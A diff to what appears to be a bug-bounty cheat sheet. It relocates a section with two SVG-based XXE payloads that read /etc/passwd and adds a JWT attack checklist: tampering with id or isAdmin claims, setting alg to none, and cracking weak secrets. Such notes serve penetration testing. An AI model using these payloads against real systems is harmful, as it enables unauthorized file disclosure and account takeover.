@@ -1193,6 +1193,8 @@ There is a awesome list of dorks located here
 Its very common for devs to accidently push  
 ```
 
+<img align = "center" src="https://miro.medium.com/max/1024/0*ddmcCZ14kuMdHBPC.png">
+
 
 #### GitMiner
 
@@ -1548,6 +1550,18 @@ SSRF
 </methodCall>
 ```
 
+#### XXE File Upload SVG
+
+```powershell
+#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
+
+```
 
 
 
@@ -1565,22 +1579,18 @@ SSRF
 WAF evasion if any.
 ```
 
-
-
-
-
-
-#### XXE File Upload SVG
+#### JWT Exploiting
 
 ```powershell
-#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
+#https://github.com/wisec/OWASP-Testing-Guide-v5/blob/master/Testing_for_APIs.md
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<svg>&xxe;</svg>
+Full details above.
 
-<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
+1) Access JWT Debugger too base64 decode and ensure that nothing sensitive is being transferred. Make sure no PII is being transferred etc.
+	2) Try chang esome values and obtain IDOR, like `id` or `isAdmin`
+	3) Modigy ALG attribute, set HS256 to null
 
+
+4) JWT Crack - https://github.com/brendan-rius/c-jwt-cracker - Secret used to encrypt tokens may be weak.
 ```
-
 
